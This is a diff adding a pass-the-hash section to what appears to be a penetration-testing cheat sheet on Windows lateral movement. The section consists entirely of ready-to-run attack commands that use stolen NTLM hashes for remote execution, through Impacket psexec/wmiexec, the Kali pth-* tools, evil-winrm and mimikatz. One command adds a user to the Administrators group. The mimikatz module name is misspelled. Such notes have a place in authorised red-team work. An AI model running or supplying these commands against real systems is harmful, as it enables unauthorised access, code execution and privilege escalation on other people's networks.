@@ -287,13 +287,27 @@ WinRM
 2. WinRS.exe/PowerShell; //winrs.exe -u admin -r:target cmd.
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## DCShadow
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## PASS-THE-HASH
 
+1. psexec.py -hashes LM:NTLM admin@target
+2. wmiexec.py -hashes :NTLM admin@target
 
+Kali tools: 
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+pth-winexe -U admin% //target cmd
+pth-wmic -U admin% //target "select Name from Win32_UserAccount"
+pth-wmis -U admin% //target "cmd.exe /c whoami > c:\out.txt"
+pth-smbclient -U admin% //target/c$
+pth-rpcclient -U admin% //target
+pth-sqsh -U admin -S target
+pth-curl http://target/exec?cmd=ipconfig
+pth-net rpc group ADDMEM 'Administrators' username -S target -U domain/user
 
+evil-winrm -i target -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0
 
-
-
-
+WINDOWS PASS-THE-HASH:
+mimikatz; //securlsa::pth /user:username /domain:domain /ntlm:NTLM_HASH /run:cmd
 
 
 
